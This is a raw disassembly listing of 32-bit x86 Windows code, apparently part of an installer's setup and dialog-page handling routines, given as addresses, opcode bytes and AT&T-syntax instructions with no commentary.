  403a6c:	53                   	push   %ebx
  403a6d:	57                   	push   %edi
  403a6e:	53                   	push   %ebx
  403a6f:	68 4c 83 40 00       	push   $0x40834c
  403a74:	68 01 00 00 80       	push   $0x80000001
  403a79:	c6 05 00 b0 42 00 30 	movb   $0x30,0x42b000
  403a80:	c6 05 01 b0 42 00 78 	movb   $0x78,0x42b001
  403a87:	88 1d 02 b0 42 00    	mov    %bl,0x42b002
  403a8d:	e8 7d 26 00 00       	call   0x40610f
  403a92:	38 1d 50 0d 42 00    	cmp    %bl,0x420d50
  403a98:	75 16                	jne    0x403ab0
  403a9a:	53                   	push   %ebx
  403a9b:	57                   	push   %edi
  403a9c:	68 6a 83 40 00       	push   $0x40836a
  403aa1:	68 24 83 40 00       	push   $0x408324
  403aa6:	68 03 00 00 80       	push   $0x80000003
  403aab:	e8 5f 26 00 00       	call   0x40610f
  403ab0:	57                   	push   %edi
  403ab1:	68 00 b0 42 00       	push   $0x42b000
  403ab6:	e8 89 27 00 00       	call   0x406244
  403abb:	e8 40 02 00 00       	call   0x403d00
  403ac0:	a1 5c 47 42 00       	mov    0x42475c,%eax
  403ac5:	bd 00 a4 42 00       	mov    $0x42a400,%ebp
  403aca:	83 e0 20             	and    $0x20,%eax
  403acd:	55                   	push   %ebp
  403ace:	a3 e0 47 42 00       	mov    %eax,0x4247e0
  403ad3:	c7 05 fc 47 42 00 00 	movl   $0x10000,0x4247fc
  403ada:	00 01 00 
  403add:	e8 cc 21 00 00       	call   0x405cae
  403ae2:	85 c0                	test   %eax,%eax
  403ae4:	0f 85 81 00 00 00    	jne    0x403b6b
  403aea:	8b 4e 48             	mov    0x48(%esi),%ecx
  403aed:	3b cb                	cmp    %ebx,%ecx
  403aef:	74 7a                	je     0x403b6b
  403af1:	8b 56 4c             	mov    0x4c(%esi),%edx
  403af4:	a1 98 47 42 00       	mov    0x424798,%eax
  403af9:	bf e0 36 42 00       	mov    $0x4236e0,%edi
  403afe:	53                   	push   %ebx
  403aff:	03 d0                	add    %eax,%edx
  403b01:	57                   	push   %edi
  403b02:	03 c8                	add    %eax,%ecx
  403b04:	52                   	push   %edx
  403b05:	51                   	push   %ecx
  403b06:	ff 76 44             	push   0x44(%esi)
  403b09:	e8 01 26 00 00       	call   0x40610f
  403b0e:	a0 e0 36 42 00       	mov    0x4236e0,%al
  403b13:	3a c3                	cmp    %bl,%al
  403b15:	74 54                	je     0x403b6b
  403b17:	3c 22                	cmp    $0x22,%al
  403b19:	75 0f                	jne    0x403b2a
  403b1b:	bf e1 36 42 00       	mov    $0x4236e1,%edi
  403b20:	6a 22                	push   $0x22
  403b22:	57                   	push   %edi
  403b23:	e8 c3 20 00 00       	call   0x405beb
  403b28:	88 18                	mov    %bl,(%eax)
  403b2a:	57                   	push   %edi
  403b2b:	e8 0e 27 00 00       	call   0x40623e
  403b30:	8d 44 38 fc          	lea    -0x4(%eax,%edi,1),%eax
  403b34:	3b c7                	cmp    %edi,%eax
  403b36:	76 26                	jbe    0x403b5e
  403b38:	68 14 a2 40 00       	push   $0x40a214
  403b3d:	50                   	push   %eax
  403b3e:	ff 15 18 81 40 00    	call   *0x408118
  403b44:	85 c0                	test   %eax,%eax
  403b46:	75 16                	jne    0x403b5e
  403b48:	57                   	push   %edi
  403b49:	ff 15 f4 80 40 00    	call   *0x4080f4
  403b4f:	83 f8 ff             	cmp    $0xffffffff,%eax
  403b52:	74 04                	je     0x403b58
  403b54:	a8 10                	test   $0x10,%al
  403b56:	75 06                	jne    0x403b5e
  403b58:	57                   	push   %edi
  403b59:	e8 a9 20 00 00       	call   0x405c07
  403b5e:	57                   	push   %edi
  403b5f:	e8 5c 20 00 00       	call   0x405bc0
  403b64:	50                   	push   %eax
  403b65:	55                   	push   %ebp
  403b66:	e8 bd 26 00 00       	call   0x406228
  403b6b:	55                   	push   %ebp
  403b6c:	e8 3d 21 00 00       	call   0x405cae
  403b71:	85 c0                	test   %eax,%eax
  403b73:	75 0c                	jne    0x403b81
  403b75:	ff b6 18 01 00 00    	push   0x118(%esi)
  403b7b:	55                   	push   %ebp
  403b7c:	e8 3a 27 00 00       	call   0x4062bb
  403b81:	68 40 80 00 00       	push   $0x8040
  403b86:	53                   	push   %ebx
  403b87:	53                   	push   %ebx
  403b88:	6a 01                	push   $0x1
  403b8a:	6a 67                	push   $0x67
  403b8c:	ff 35 40 47 42 00    	push   0x424740
  403b92:	ff 15 4c 82 40 00    	call   *0x40824c
  403b98:	a3 28 3f 42 00       	mov    %eax,0x423f28
  403b9d:	83 7e 50 ff          	cmpl   $0xffffffff,0x50(%esi)
  403ba1:	bf e0 3e 42 00       	mov    $0x423ee0,%edi
  403ba6:	74 7f                	je     0x403c27
  403ba8:	8b 0d 40 47 42 00    	mov    0x424740,%ecx
  403bae:	be 10 a2 40 00       	mov    $0x40a210,%esi
  403bb3:	57                   	push   %edi
  403bb4:	c7 05 e4 3e 42 00 00 	movl   $0x401000,0x423ee4
  403bbb:	10 40 00 
  403bbe:	89 0d f0 3e 42 00    	mov    %ecx,0x423ef0
  403bc4:	a3 f4 3e 42 00       	mov    %eax,0x423ef4
  403bc9:	89 35 04 3f 42 00    	mov    %esi,0x423f04
  403bcf:	ff 15 f0 81 40 00    	call   *0x4081f0
  403bd5:	66 85 c0             	test   %ax,%ax
  403bd8:	0f 84 18 01 00 00    	je     0x403cf6
  403bde:	8d 44 24 10          	lea    0x10(%esp),%eax
  403be2:	53                   	push   %ebx
  403be3:	50                   	push   %eax
  403be4:	53                   	push   %ebx
  403be5:	6a 30                	push   $0x30
  403be7:	ff 15 00 82 40 00    	call   *0x408200
  403bed:	53                   	push   %ebx
  403bee:	ff 35 40 47 42 00    	push   0x424740
  403bf4:	8b 44 24 24          	mov    0x24(%esp),%eax
  403bf8:	2b 44 24 1c          	sub    0x1c(%esp),%eax
  403bfc:	53                   	push   %ebx
  403bfd:	53                   	push   %ebx
  403bfe:	50                   	push   %eax
  403bff:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  403c03:	2b 44 24 24          	sub    0x24(%esp),%eax
  403c07:	50                   	push   %eax
  403c08:	ff 74 24 2c          	push   0x2c(%esp)
  403c0c:	ff 74 24 2c          	push   0x2c(%esp)
  403c10:	68 00 00 00 80       	push   $0x80000000
  403c15:	53                   	push   %ebx
  403c16:	56                   	push   %esi
  403c17:	68 80 00 00 00       	push   $0x80
  403c1c:	ff 15 04 82 40 00    	call   *0x408204
  403c22:	a3 30 0d 42 00       	mov    %eax,0x420d30
  403c27:	53                   	push   %ebx
  403c28:	e8 de d7 ff ff       	call   0x40140b
  403c2d:	85 c0                	test   %eax,%eax
  403c2f:	74 08                	je     0x403c39
  403c31:	6a 02                	push   $0x2
  403c33:	58                   	pop    %eax
  403c34:	e9 bf 00 00 00       	jmp    0x403cf8
  403c39:	e8 c2 00 00 00       	call   0x403d00
  403c3e:	39 1d 00 48 42 00    	cmp    %ebx,0x424800
  403c44:	0f 85 83 00 00 00    	jne    0x403ccd
  403c4a:	6a 05                	push   $0x5
  403c4c:	ff 35 30 0d 42 00    	push   0x420d30
  403c52:	ff 15 30 82 40 00    	call   *0x408230
  403c58:	68 18 83 40 00       	push   $0x408318
  403c5d:	e8 61 29 00 00       	call   0x4065c3
  403c62:	85 c0                	test   %eax,%eax
  403c64:	75 0a                	jne    0x403c70
  403c66:	68 0c 83 40 00       	push   $0x40830c
  403c6b:	e8 53 29 00 00       	call   0x4065c3
  403c70:	8b 35 fc 81 40 00    	mov    0x4081fc,%esi
  403c76:	bd 00 83 40 00       	mov    $0x408300,%ebp
  403c7b:	57                   	push   %edi
  403c7c:	55                   	push   %ebp
  403c7d:	53                   	push   %ebx
  403c7e:	ff d6                	call   *%esi
  403c80:	85 c0                	test   %eax,%eax
  403c82:	75 16                	jne    0x403c9a
  403c84:	57                   	push   %edi
  403c85:	68 f4 82 40 00       	push   $0x4082f4
  403c8a:	53                   	push   %ebx
  403c8b:	ff d6                	call   *%esi
  403c8d:	57                   	push   %edi
  403c8e:	89 2d 04 3f 42 00    	mov    %ebp,0x423f04
  403c94:	ff 15 f0 81 40 00    	call   *0x4081f0
  403c9a:	a1 20 3f 42 00       	mov    0x423f20,%eax
  403c9f:	53                   	push   %ebx
  403ca0:	83 c0 69             	add    $0x69,%eax
  403ca3:	68 d8 3d 40 00       	push   $0x403dd8
  403ca8:	0f b7 c0             	movzwl %ax,%eax
  403cab:	53                   	push   %ebx
  403cac:	50                   	push   %eax
  403cad:	ff 35 40 47 42 00    	push   0x424740
  403cb3:	ff 15 0c 82 40 00    	call   *0x40820c
  403cb9:	6a 05                	push   $0x5
  403cbb:	8b f0                	mov    %eax,%esi
  403cbd:	e8 49 d7 ff ff       	call   0x40140b
  403cc2:	6a 01                	push   $0x1
  403cc4:	e8 c2 fc ff ff       	call   0x40398b
  403cc9:	8b c6                	mov    %esi,%eax
  403ccb:	eb 2b                	jmp    0x403cf8
  403ccd:	53                   	push   %ebx
  403cce:	e8 4e 17 00 00       	call   0x405421
  403cd3:	85 c0                	test   %eax,%eax
  403cd5:	74 18                	je     0x403cef
  403cd7:	39 1d 0c 3f 42 00    	cmp    %ebx,0x423f0c
  403cdd:	0f 85 4e ff ff ff    	jne    0x403c31
  403ce3:	6a 02                	push   $0x2
  403ce5:	e8 21 d7 ff ff       	call   0x40140b
  403cea:	e9 42 ff ff ff       	jmp    0x403c31
  403cef:	6a 01                	push   $0x1
  403cf1:	e8 15 d7 ff ff       	call   0x40140b
  403cf6:	33 c0                	xor    %eax,%eax
  403cf8:	5f                   	pop    %edi
  403cf9:	5e                   	pop    %esi
  403cfa:	5d                   	pop    %ebp
  403cfb:	5b                   	pop    %ebx
  403cfc:	83 c4 10             	add    $0x10,%esp
  403cff:	c3                   	ret
  403d00:	53                   	push   %ebx
  403d01:	55                   	push   %ebp
  403d02:	56                   	push   %esi
  403d03:	57                   	push   %edi
  403d04:	bf 00 b0 42 00       	mov    $0x42b000,%edi
  403d09:	bb ff ff 00 00       	mov    $0xffff,%ebx
  403d0e:	57                   	push   %edi
  403d0f:	e8 8b 24 00 00       	call   0x40619f
  403d14:	8b 35 a4 47 42 00    	mov    0x4247a4,%esi
  403d1a:	85 f6                	test   %esi,%esi
  403d1c:	74 45                	je     0x403d63
  403d1e:	8b 0d 54 47 42 00    	mov    0x424754,%ecx
  403d24:	8b 49 64             	mov    0x64(%ecx),%ecx
  403d27:	8b d1                	mov    %ecx,%edx
  403d29:	0f af ce             	imul   %esi,%ecx
  403d2c:	f7 da                	neg    %edx
  403d2e:	03 0d a0 47 42 00    	add    0x4247a0,%ecx
  403d34:	03 ca                	add    %edx,%ecx
  403d36:	4e                   	dec    %esi
  403d37:	66 8b 29             	mov    (%ecx),%bp
  403d3a:	66 33 e8             	xor    %ax,%bp
  403d3d:	23 eb                	and    %ebx,%ebp
  403d3f:	66 85 ed             	test   %bp,%bp
  403d42:	74 06                	je     0x403d4a
  403d44:	85 f6                	test   %esi,%esi
  403d46:	75 ec                	jne    0x403d34
  403d48:	eb 19                	jmp    0x403d63
  403d4a:	8b 51 02             	mov    0x2(%ecx),%edx
  403d4d:	89 15 20 3f 42 00    	mov    %edx,0x423f20
  403d53:	8b 51 06             	mov    0x6(%ecx),%edx
  403d56:	89 15 08 48 42 00    	mov    %edx,0x424808
  403d5c:	8d 51 0a             	lea    0xa(%ecx),%edx
  403d5f:	85 d2                	test   %edx,%edx
  403d61:	75 12                	jne    0x403d75
  403d63:	66 81 fb ff ff       	cmp    $0xffff,%bx
  403d68:	75 07                	jne    0x403d71
  403d6a:	bb ff 03 00 00       	mov    $0x3ff,%ebx
  403d6f:	eb a3                	jmp    0x403d14
  403d71:	33 db                	xor    %ebx,%ebx
  403d73:	eb 9f                	jmp    0x403d14
  403d75:	89 15 1c 3f 42 00    	mov    %edx,0x423f1c
  403d7b:	0f b7 01             	movzwl (%ecx),%eax
  403d7e:	50                   	push   %eax
  403d7f:	57                   	push   %edi
  403d80:	e8 01 24 00 00       	call   0x406186
  403d85:	e8 2f 00 00 00       	call   0x403db9
  403d8a:	a1 8c 47 42 00       	mov    0x42478c,%eax
  403d8f:	8b 35 88 47 42 00    	mov    0x424788,%esi
  403d95:	85 c0                	test   %eax,%eax
  403d97:	74 1b                	je     0x403db4
  403d99:	8b f8                	mov    %eax,%edi
  403d9b:	8b 06                	mov    (%esi),%eax
  403d9d:	85 c0                	test   %eax,%eax
  403d9f:	74 0a                	je     0x403dab
  403da1:	50                   	push   %eax
  403da2:	8d 46 18             	lea    0x18(%esi),%eax
  403da5:	50                   	push   %eax
  403da6:	e8 10 25 00 00       	call   0x4062bb
  403dab:	81 c6 18 04 00 00    	add    $0x418,%esi
  403db1:	4f                   	dec    %edi
  403db2:	75 e7                	jne    0x403d9b
  403db4:	5f                   	pop    %edi
  403db5:	5e                   	pop    %esi
  403db6:	5d                   	pop    %ebp
  403db7:	5b                   	pop    %ebx
  403db8:	c3                   	ret
  403db9:	56                   	push   %esi
  403dba:	be 40 3f 42 00       	mov    $0x423f40,%esi
  403dbf:	6a fe                	push   $0xfffffffe
  403dc1:	56                   	push   %esi
  403dc2:	e8 f4 24 00 00       	call   0x4062bb
  403dc7:	56                   	push   %esi
  403dc8:	ff 35 30 0d 42 00    	push   0x420d30
  403dce:	ff 15 24 82 40 00    	call   *0x408224
  403dd4:	8b c6                	mov    %esi,%eax
  403dd6:	5e                   	pop    %esi
  403dd7:	c3                   	ret
  403dd8:	83 ec 10             	sub    $0x10,%esp
  403ddb:	b9 10 01 00 00       	mov    $0x110,%ecx
  403de0:	53                   	push   %ebx
  403de1:	8b 5c 24 1c          	mov    0x1c(%esp),%ebx
  403de5:	55                   	push   %ebp
  403de6:	56                   	push   %esi
  403de7:	3b d9                	cmp    %ecx,%ebx
  403de9:	57                   	push   %edi
  403dea:	0f 84 3b 01 00 00    	je     0x403f2b
  403df0:	81 fb 08 04 00 00    	cmp    $0x408,%ebx
  403df6:	0f 84 2f 01 00 00    	je     0x403f2b
  403dfc:	8b 7c 24 24          	mov    0x24(%esp),%edi
  403e00:	33 ed                	xor    %ebp,%ebp
  403e02:	83 fb 47             	cmp    $0x47,%ebx
  403e05:	75 13                	jne    0x403e1a
  403e07:	6a 13                	push   $0x13
  403e09:	55                   	push   %ebp
  403e0a:	55                   	push   %ebp
  403e0b:	55                   	push   %ebp
  403e0c:	55                   	push   %ebp
  403e0d:	57                   	push   %edi
  403e0e:	ff 35 30 0d 42 00    	push   0x420d30
  403e14:	ff 15 dc 81 40 00    	call   *0x4081dc
  403e1a:	83 fb 05             	cmp    $0x5,%ebx
  403e1d:	75 18                	jne    0x403e37
  403e1f:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  403e23:	48                   	dec    %eax
  403e24:	f7 d8                	neg    %eax
  403e26:	1b c0                	sbb    %eax,%eax
  403e28:	23 c3                	and    %ebx,%eax
  403e2a:	50                   	push   %eax
  403e2b:	ff 35 30 0d 42 00    	push   0x420d30
  403e31:	ff 15 30 82 40 00    	call   *0x408230
  403e37:	81 fb 0d 04 00 00    	cmp    $0x40d,%ebx
  403e3d:	75 1a                	jne    0x403e59
  403e3f:	ff 35 18 3f 42 00    	push   0x423f18
  403e45:	ff 15 18 82 40 00    	call   *0x408218
  403e4b:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  403e4f:	a3 18 3f 42 00       	mov    %eax,0x423f18
  403e54:	e9 fd 03 00 00       	jmp    0x404256
  403e59:	83 fb 11             	cmp    $0x11,%ebx
  403e5c:	75 11                	jne    0x403e6f
  403e5e:	55                   	push   %ebp
  403e5f:	55                   	push   %ebp
  403e60:	57                   	push   %edi
  403e61:	ff 15 48 82 40 00    	call   *0x408248
  403e67:	33 c0                	xor    %eax,%eax
  403e69:	40                   	inc    %eax
  403e6a:	e9 0c 04 00 00       	jmp    0x40427b
  403e6f:	81 fb 11 01 00 00    	cmp    $0x111,%ebx
  403e75:	0f 85 9d 00 00 00    	jne    0x403f18
  403e7b:	0f b7 74 24 2c       	movzwl 0x2c(%esp),%esi
  403e80:	56                   	push   %esi
  403e81:	57                   	push   %edi
  403e82:	ff 15 38 82 40 00    	call   *0x408238
  403e88:	8b f8                	mov    %eax,%edi
  403e8a:	3b fd                	cmp    %ebp,%edi
  403e8c:	74 1d                	je     0x403eab
  403e8e:	55                   	push   %ebp
  403e8f:	55                   	push   %ebp
  403e90:	68 f3 00 00 00       	push   $0xf3
  403e95:	57                   	push   %edi
  403e96:	ff 15 60 82 40 00    	call   *0x408260
  403e9c:	57                   	push   %edi
  403e9d:	ff 15 e0 81 40 00    	call   *0x4081e0
  403ea3:	85 c0                	test   %eax,%eax
  403ea5:	0f 84 ce 03 00 00    	je     0x404279
  403eab:	83 fe 01             	cmp    $0x1,%esi
  403eae:	75 03                	jne    0x403eb3
  403eb0:	56                   	push   %esi
  403eb1:	eb 2e                	jmp    0x403ee1
  403eb3:	83 fe 03             	cmp    $0x3,%esi
  403eb6:	75 0c                	jne    0x403ec4
  403eb8:	39 2d f8 a1 40 00    	cmp    %ebp,0x40a1f8
  403ebe:	7e 3f                	jle    0x403eff
  403ec0:	6a ff                	push   $0xffffffff
  403ec2:	eb 1d                	jmp    0x403ee1
  403ec4:	6a 02                	push   $0x2
  403ec6:	5f                   	pop    %edi
  403ec7:	3b f7                	cmp    %edi,%esi
  403ec9:	75 34                	jne    0x403eff
  403ecb:	39 2d ec 47 42 00    	cmp    %ebp,0x4247ec
  403ed1:	74 15                	je     0x403ee8
  403ed3:	57                   	push   %edi
  403ed4:	e8 32 d5 ff ff       	call   0x40140b
  403ed9:	89 3d 20 01 42 00    	mov    %edi,0x420120
  403edf:	6a 78                	push   $0x78
  403ee1:	e8 9f 03 00 00       	call   0x404285
  403ee6:	eb 30                	jmp    0x403f18
  403ee8:	6a 03                	push   $0x3
  403eea:	e8 1c d5 ff ff       	call   0x40140b
  403eef:	85 c0                	test   %eax,%eax
  403ef1:	75 25                	jne    0x403f18
  403ef3:	c7 05 20 01 42 00 01 	movl   $0x1,0x420120
  403efa:	00 00 00 
  403efd:	eb e0                	jmp    0x403edf
  403eff:	ff 74 24 30          	push   0x30(%esp)
  403f03:	ff 74 24 30          	push   0x30(%esp)
  403f07:	68 11 01 00 00       	push   $0x111
  403f0c:	ff 35 18 3f 42 00    	push   0x423f18
  403f12:	ff 15 60 82 40 00    	call   *0x408260
  403f18:	ff 74 24 30          	push   0x30(%esp)
  403f1c:	ff 74 24 30          	push   0x30(%esp)
  403f20:	53                   	push   %ebx
  403f21:	e8 ed 03 00 00       	call   0x404313
  403f26:	e9 50 03 00 00       	jmp    0x40427b
  403f2b:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  403f2f:	8b 7c 24 24          	mov    0x24(%esp),%edi
  403f33:	3b d9                	cmp    %ecx,%ebx
  403f35:	a3 38 0d 42 00       	mov    %eax,0x420d38
  403f3a:	75 4d                	jne    0x403f89
  403f3c:	8b 35 38 82 40 00    	mov    0x408238,%esi
  403f42:	6a 01                	push   $0x1
  403f44:	57                   	push   %edi
  403f45:	89 3d 48 47 42 00    	mov    %edi,0x424748
  403f4b:	ff d6                	call   *%esi
  403f4d:	6a 02                	push   $0x2
  403f4f:	57                   	push   %edi
  403f50:	a3 4c 0d 42 00       	mov    %eax,0x420d4c
  403f55:	ff d6                	call   *%esi
  403f57:	6a ff                	push   $0xffffffff
  403f59:	6a 1c                	push   $0x1c
  403f5b:	57                   	push   %edi
  403f5c:	a3 18 fd 41 00       	mov    %eax,0x41fd18
  403f61:	e8 46 03 00 00       	call   0x4042ac
  403f66:	ff 35 28 3f 42 00    	push   0x423f28
  403f6c:	6a f2                	push   $0xfffffff2
  403f6e:	57                   	push   %edi
  403f6f:	ff 15 d8 81 40 00    	call   *0x4081d8
  403f75:	6a 04                	push   $0x4
  403f77:	e8 8f d4 ff ff       	call   0x40140b
  403f7c:	a3 0c 3f 42 00       	mov    %eax,0x423f0c
  403f81:	33 c0                	xor    %eax,%eax
  403f83:	40                   	inc    %eax
  403f84:	a3 38 0d 42 00       	mov    %eax,0x420d38
  403f89:	8b 0d f8 a1 40 00    	mov    0x40a1f8,%ecx
  403f8f:	33 ed                	xor    %ebp,%ebp
  403f91:	8b f1                	mov    %ecx,%esi
  403f93:	c1 e6 06             	shl    $0x6,%esi
  403f96:	03 35 80 47 42 00    	add    0x424780,%esi
  403f9c:	3b cd                	cmp    %ebp,%ecx
  403f9e:	7c 3e                	jl     0x403fde
  403fa0:	83 f8 01             	cmp    $0x1,%eax
  403fa3:	75 31                	jne    0x403fd6
  403fa5:	55                   	push   %ebp
  403fa6:	ff 76 10             	push   0x10(%esi)
  403fa9:	e8 db d3 ff ff       	call   0x401389
  403fae:	85 c0                	test   %eax,%eax
  403fb0:	74 24                	je     0x403fd6
  403fb2:	6a 01                	push   $0x1
  403fb4:	55                   	push   %ebp
  403fb5:	68 0f 04 00 00       	push   $0x40f
  403fba:	ff 35 18 3f 42 00    	push   0x423f18
  403fc0:	ff 15 60 82 40 00    	call   *0x408260
  403fc6:	33 c0                	xor    %eax,%eax
  403fc8:	39 2d 0c 3f 42 00    	cmp    %ebp,0x423f0c
  403fce:	0f 94 c0             	sete   %al
  403fd1:	e9 a5 02 00 00       	jmp    0x40427b
  403fd6:	39 2e                	cmp    %ebp,(%esi)
  403fd8:	0f 84 9b 02 00 00    	je     0x404279
  403fde:	68 0b 04 00 00       	push   $0x40b
  403fe3:	e8 10 03 00 00       	call   0x4042f8
  403fe8:	a1 38 0d 42 00       	mov    0x420d38,%eax
  403fed:	01 05 f8 a1 40 00    	add    %eax,0x40a1f8
  403ff3:	c1 e0 06             	shl    $0x6,%eax
  403ff6:	03 f0                	add    %eax,%esi
  403ff8:	a1 f8 a1 40 00       	mov    0x40a1f8,%eax
  403ffd:	3b 05 84 47 42 00    	cmp    0x424784,%eax
  404003:	75 07                	jne    0x40400c
  404005:	6a 01                	push   $0x1
  404007:	e8 ff d3 ff ff       	call   0x40140b
  40400c:	39 2d 0c 3f 42 00    	cmp    %ebp,0x423f0c
  404012:	0f 85 1f 02 00 00    	jne    0x404237
  404018:	a1 84 47 42 00       	mov    0x424784,%eax
  40401d:	39 05 f8 a1 40 00    	cmp    %eax,0x40a1f8
  404023:	0f 83 0e 02 00 00    	jae    0x404237
  404029:	ff 76 24             	push   0x24(%esi)
  40402c:	8b 5e 14             	mov    0x14(%esi),%ebx
  40402f:	68 00 c8 42 00       	push   $0x42c800
  404034:	e8 82 22 00 00       	call   0x4062bb
  404039:	ff 76 20             	push   0x20(%esi)
  40403c:	68 19 fc ff ff       	push   $0xfffffc19
  404041:	57                   	push   %edi
  404042:	e8 65 02 00 00       	call   0x4042ac
  404047:	ff 76 1c             	push   0x1c(%esi)
  40404a:	68 1b fc ff ff       	push   $0xfffffc1b
  40404f:	57                   	push   %edi
  404050:	e8 57 02 00 00       	call   0x4042ac
  404055:	ff 76 28             	push   0x28(%esi)
  404058:	68 1a fc ff ff       	push   $0xfffffc1a
  40405d:	57                   	push   %edi
  40405e:	e8 49 02 00 00       	call   0x4042ac
  404063:	6a 03                	push   $0x3
  404065:	57                   	push   %edi
  404066:	ff 15 38 82 40 00    	call   *0x408238
  40406c:	39 2d ec 47 42 00    	cmp    %ebp,0x4247ec
  404072:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  404076:	74 08                	je     0x404080
  404078:	66 81 e3 fd fe       	and    $0xfefd,%bx
  40407d:	83 cb 04             	or     $0x4,%ebx
  404080:	8b cb                	mov    %ebx,%ecx
  404082:	83 e1 08             	and    $0x8,%ecx
  404085:	51                   	push   %ecx
  404086:	50                   	push   %eax
  404087:	ff 15 30 82 40 00    	call   *0x408230
  40408d:	8b c3                	mov    %ebx,%eax
  40408f:	25 00 01 00 00       	and    $0x100,%eax
  404094:	50                   	push   %eax
  404095:	ff 74 24 30          	push   0x30(%esp)
  404099:	ff 15 58 82 40 00    	call   *0x408258
  40409f:	8b c3                	mov    %ebx,%eax
  4040a1:	83 e0 02             	and    $0x2,%eax
  4040a4:	50                   	push   %eax
  4040a5:	e8 24 02 00 00       	call   0x4042ce
  4040aa:	83 e3 04             	and    $0x4,%ebx
  4040ad:	53                   	push   %ebx
  4040ae:	ff 35 18 fd 41 00    	push   0x41fd18
  4040b4:	ff 15 58 82 40 00    	call   *0x408258
  4040ba:	3b dd                	cmp    %ebp,%ebx
  4040bc:	74 03                	je     0x4040c1
  4040be:	55                   	push   %ebp
  4040bf:	eb 02                	jmp    0x4040c3
  4040c1:	6a 01                	push   $0x1
  4040c3:	68 60 f0 00 00       	push   $0xf060
  4040c8:	55                   	push   %ebp
  4040c9:	57                   	push   %edi
  4040ca:	ff 15 e8 81 40 00    	call   *0x4081e8
  4040d0:	50                   	push   %eax
  4040d1:	ff 15 ec 81 40 00    	call   *0x4081ec
  4040d7:	8b 1d 60 82 40 00    	mov    0x408260,%ebx
  4040dd:	6a 01                	push   $0x1
  4040df:	55                   	push   %ebp
  4040e0:	68 f4 00 00 00       	push   $0xf4
  4040e5:	ff 74 24 38          	push   0x38(%esp)
  4040e9:	ff d3                	call   *%ebx
  4040eb:	39 2d ec 47 42 00    	cmp    %ebp,0x4247ec
  4040f1:	74 13                	je     0x404106
  4040f3:	55                   	push   %ebp
  4040f4:	6a 02                	push   $0x2
  4040f6:	68 01 04 00 00       	push   $0x401
  4040fb:	57                   	push   %edi
  4040fc:	ff d3                	call   *%ebx
  4040fe:	ff 35 18 fd 41 00    	push   0x41fd18
  404104:	eb 06                	jmp    0x40410c
  404106:	ff 35 4c 0d 42 00    	push   0x420d4c
  40410c:	e8 d0 01 00 00       	call   0x4042e1
  404111:	e8 a3 fc ff ff       	call   0x403db9
  404116:	bb 50 0d 42 00       	mov    $0x420d50,%ebx
  40411b:	50                   	push   %eax
  40411c:	53                   	push   %ebx
  40411d:	e8 06 21 00 00       	call   0x406228
  404122:	ff 76 18             	push   0x18(%esi)
  404125:	53                   	push   %ebx
  404126:	e8 13 21 00 00       	call   0x40623e
  40412b:	03 c3                	add    %ebx,%eax
  40412d:	50                   	push   %eax
  40412e:	e8 88 21 00 00       	call   0x4062bb
  404133:	53                   	push   %ebx
  404134:	57                   	push   %edi
  404135:	ff 15 24 82 40 00    	call   *0x408224
  40413b:	55                   	push   %ebp
  40413c:	ff 76 08             	push   0x8(%esi)
  40413f:	e8 45 d2 ff ff       	call   0x401389
  404144:	85 c0                	test   %eax,%eax
  404146:	0f 85 9c fe ff ff    	jne    0x403fe8
  40414c:	39 2e                	cmp    %ebp,(%esi)
  40414e:	0f 84 94 fe ff ff    	je     0x403fe8
  404154:	83 7e 04 05          	cmpl   $0x5,0x4(%esi)
  404158:	75 1d                	jne    0x404177
  40415a:	39 2d ec 47 42 00    	cmp    %ebp,0x4247ec
  404160:	0f 85 13 01 00 00    	jne    0x404279
  404166:	39 2d e0 47 42 00    	cmp    %ebp,0x4247e0
  40416c:	0f 85 76 fe ff ff    	jne    0x403fe8
  404172:	e9 02 01 00 00       	jmp    0x404279
  404177:	ff 35 18 3f 42 00    	push   0x423f18
  40417d:	ff 15 18 82 40 00    	call   *0x408218
  404183:	89 35 28 05 42 00    	mov    %esi,0x420528
  404189:	39 2e                	cmp    %ebp,(%esi)
  40418b:	0f 8e c5 00 00 00    	jle    0x404256
  404191:	8b 46 04             	mov    0x4(%esi),%eax
  404194:	56                   	push   %esi
  404195:	ff 34 85 fc a1 40 00 	push   0x40a1fc(,%eax,4)
  40419c:	66 8b 06             	mov    (%esi),%ax
  40419f:	66 03 05 20 3f 42 00 	add    0x423f20,%ax
  4041a6:	57                   	push   %edi
  4041a7:	0f b7 c0             	movzwl %ax,%eax
  4041aa:	50                   	push   %eax
  4041ab:	ff 35 40 47 42 00    	push   0x424740
  4041b1:	ff 15 1c 82 40 00    	call   *0x40821c
  4041b7:	3b c5                	cmp    %ebp,%eax
  4041b9:	a3 18 3f 42 00       	mov    %eax,0x423f18
  4041be:	0f 84 92 00 00 00    	je     0x404256
  4041c4:	ff 76 2c             	push   0x2c(%esi)
  4041c7:	6a 06                	push   $0x6
  4041c9:	50                   	push   %eax
  4041ca:	e8 dd 00 00 00       	call   0x4042ac
  4041cf:	8d 44 24 10          	lea    0x10(%esp),%eax
  4041d3:	50                   	push   %eax
  4041d4:	68 fa 03 00 00       	push   $0x3fa
  4041d9:	57                   	push   %edi
  4041da:	ff 15 38 82 40 00    	call   *0x408238
  4041e0:	50                   	push   %eax
  4041e1:	ff 15 e4 81 40 00    	call   *0x4081e4
  4041e7:	8d 44 24 10          	lea    0x10(%esp),%eax
  4041eb:	50                   	push   %eax
  4041ec:	57                   	push   %edi
  4041ed:	ff 15 f4 81 40 00    	call   *0x4081f4
  4041f3:	6a 15                	push   $0x15
  4041f5:	55                   	push   %ebp
  4041f6:	55                   	push   %ebp
  4041f7:	ff 74 24 20          	push   0x20(%esp)
  4041fb:	ff 74 24 20          	push   0x20(%esp)
  4041ff:	55                   	push   %ebp
  404200:	ff 35 18 3f 42 00    	push   0x423f18
  404206:	ff 15 dc 81 40 00    	call   *0x4081dc
  40420c:	55                   	push   %ebp
  40420d:	ff 76 0c             	push   0xc(%esi)
  404210:	e8 74 d1 ff ff       	call   0x401389
  404215:	39 2d 0c 3f 42 00    	cmp    %ebp,0x423f0c
  40421b:	75 5c                	jne    0x404279
  40421d:	6a 08                	push   $0x8
  40421f:	ff 35 18 3f 42 00    	push   0x423f18
  404225:	ff 15 30 82 40 00    	call   *0x408230
  40422b:	68 05 04 00 00       	push   $0x405
  404230:	e8 c3 00 00 00       	call   0x4042f8
  404235:	eb 1f                	jmp    0x404256
  404237:	ff 35 18 3f 42 00    	push   0x423f18
